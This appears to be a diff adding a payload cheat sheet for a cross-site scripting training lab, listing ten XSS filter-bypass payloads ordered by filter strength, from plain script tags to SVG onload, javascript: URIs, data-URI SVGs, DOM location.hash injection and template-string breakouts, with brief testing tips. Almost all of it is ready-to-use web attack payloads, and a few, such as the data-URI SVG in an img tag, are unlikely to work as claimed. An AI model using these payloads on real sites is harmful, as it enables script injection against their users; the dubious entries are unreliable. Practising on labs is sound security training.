@@ -1,0 +1,39 @@
+# XSS filter bypasses — organized from easy -> hard
+# Use these on the Filter lab (select different filter levels) and on Reflected/Stored contexts.
+
+# Level 0: trivial (works when no filtering)
+1) <script>alert(1)</script>
+2) <img src=x onerror=alert(1)>
+
+# Level 1: naive filter that strips <script> and on* attributes
+3) <img src=x onerror=alert(1)>  -- may be blocked by naive on* strip
+Bypass: <svg onload=alert(1)>
+
+# Level 2: strip_tags() or basic tag stripping
+4) javascript:alert(1) in href
+Bypass: <a href="javascript:alert(1)">click</a>
+Better: <svg><a href="javascript:alert(1)">x</a></svg>
+
+# Level 3: regex removing < and > or "javascript:"
+5) %3Cscript%3Ealert(1)%3C/script%3E  (URL-encoded - if decoder runs after filter it may trigger)
+Bypass: <img src=data:image/svg+xml;charset=utf-8,%3Csvg%20onload=alert(1)%3E%3C/svg%3E>
+
+# Level 4: htmlspecialchars/encoding applied server-side
+6) Use event handlers in SVG/XML entities:
+   <svg xmlns='http://www.w3.org/2000/svg'><foreignObject><body onload=alert(1)></body></foreignObject></svg>
+
+# Level 5: Modern CSP/strong filters — DOM-only or polyglot attacks
+7) Location-based DOM XSS:
+   location.hash = '#"><img src=x onerror=alert(1)>';
+   (works if app unsafely writes location.hash via innerHTML)
+8) Polyglot SVG with data URIs:
+   <img src="data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' onload=alert(1)></svg>">
+
+# Level 6: Advanced - Use javascript URIs in href after bypassing filters, exploiting attribute contexts, or using template engines
+9) Mutation-based DOM: createElement('img').src='data:image/svg+xml;utf8,<svg onload=alert(1)></svg>'
+10) Using backticks and template injections when app inserts into JS template strings: `);alert(1);//
+
+# Notes:
+- Always test payloads in the specific context (HTML body, attribute, JS string, CSS).
+- Filters ordering matters: client-side filters are bypassable; server-side encoding is the strongest.
+- Try encoding (UTF-8 variations), nested tags, Unicode homoglyphs, and event handlers on rarely filtered tags (<svg>, <math>, <iframe> under some conditions).
